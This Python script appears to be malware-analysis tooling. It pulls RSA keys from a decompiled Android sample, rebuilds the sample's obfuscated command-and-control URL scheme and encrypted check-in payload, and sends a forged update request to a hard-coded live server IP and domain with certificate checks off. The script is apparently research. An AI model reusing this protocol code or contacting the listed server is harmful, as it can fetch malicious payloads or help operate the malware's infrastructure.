import ssl, urllib.request, json, time, random, struct, uuid, hashlib
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

# Load keys from r.java
# byte[] a is X.509 SubjectPublicKeyInfo
# byte[] b is PKCS#8 PrivateKeyInfo

def load_keys():
    with open('extracted/stage2_src/sources/com/c/j/r.java', 'r') as f:
        content = f.read()
    
    import re
    def parse_arr(name):
        m = re.search(r'public static final byte\[\] ' + name + r' = \{([^}]+)\};', content)
        text = m.group(1).replace('Byte.MAX_VALUE', '127').replace('Byte.MIN_VALUE', '-128')
        nums = [int(x) & 0xff for x in re.findall(r'(-?\d+)', text)]
        return bytes(nums)
    
    pub_bytes = parse_arr('a')
    priv_bytes = parse_arr('b')
    
    pub_key = serialization.load_der_public_key(pub_bytes, backend=default_backend())
    priv_key = serialization.load_der_private_key(priv_bytes, password=None, backend=default_backend())
    return pub_key, priv_key

pub_key, priv_key = load_keys()
print('Loaded RSA keys successfully!')

def rsa_encrypt(pub_key, data_bytes):
    # Java: Cipher.getInstance("RSA/ECB/PKCS1Padding")
    # block size: 117
    out = bytearray()
    i = 0
    while i < len(data_bytes):
        chunk = data_bytes[i : i + 117]
        i += 117
        enc = pub_key.encrypt(chunk, padding.PKCS1v15())
        out.extend(enc)
    return bytes(out)

def rsa_decrypt(priv_key, enc_bytes):
    # block size: 128
    out = bytearray()
    i = 0
    while i < len(enc_bytes):
        chunk = enc_bytes[i : i + 128]
        i += 128
        dec = priv_key.decrypt(chunk, padding.PKCS1v15())
        out.extend(dec)
    return bytes(out)

# URL generation logic from n.java:
# private static final String a = "Mu^38Ydeo233Uowd";
# StringBuilder append = new StringBuilder().append(str).append("/apiv2/");
# long currentTimeMillis = System.currentTimeMillis() / 1000;
# int nextInt = new Random().nextInt(90000) + 10000;
# b(str2, String.valueOf(nextInt)) -> hex -> + "|" + time + "|" + nextInt -> XOR with a -> hex

def xor_bytes(s_bytes, k_bytes):
    out = bytearray(len(s_bytes))
    for i in range(len(s_bytes)):
        out[i] = s_bytes[i] ^ k_bytes[i % len(k_bytes)]
    return bytes(out)

def make_url_path(endpoint='/api/rsaUpdate'):
    key_a = b'Mu^38Ydeo233Uowd'
    t = int(time.time())
    nextInt = random.randint(10000, 99999)
    # b(str2, String.valueOf(nextInt))
    x1 = xor_bytes(endpoint.encode('utf-8'), str(nextInt).encode('utf-8'))
    # convert x1 to hex
    hex1 = ''.join(f'{b:02x}' for b in x1)
    # hex1 + "|" + t + "|" + nextInt
    inner = f'{hex1}|{t}|{nextInt}'.encode('utf-8')
    x2 = xor_bytes(inner, key_a)
    hex2 = ''.join(f'{b:02x}' for b in x2)
    return f'/apiv2/{hex2}'

# Payload generation from m.java:
payload_dict = {
    'userId': str(uuid.uuid4()),
    'dexVersion': '1.7',
    'dexType': 1,
    'channelId': '2039',
    'packageName': 'com.tw.jar1',
    'appVersion': 12,
    'appName': 'jar1'
}

body_json = json.dumps(payload_dict)
print('Payload JSON:', body_json)

enc_body = rsa_encrypt(pub_key, body_json.encode('utf-8'))
path = make_url_path('/api/rsaUpdate')
print('Generated path:', path)

# Try sending to port 31782 (HTTPS) and 32024 (HTTP)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = f'https://154.57.164.82:31782{path}'
req = urllib.request.Request(url, data=enc_body, headers={
    'Host': 'a1.ishano456.sbs',
    'Content-Type': 'application/octet-stream'
})

try:
    with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
        resp_data = resp.read()
        print('HTTPS Response status:', resp.status, 'len:', len(resp_data))
        dec = rsa_decrypt(priv_key, resp_data)
        print('Decrypted response:', dec.decode('utf-8', errors='replace'))
except Exception as e:
    print('HTTPS Request failed:', e)
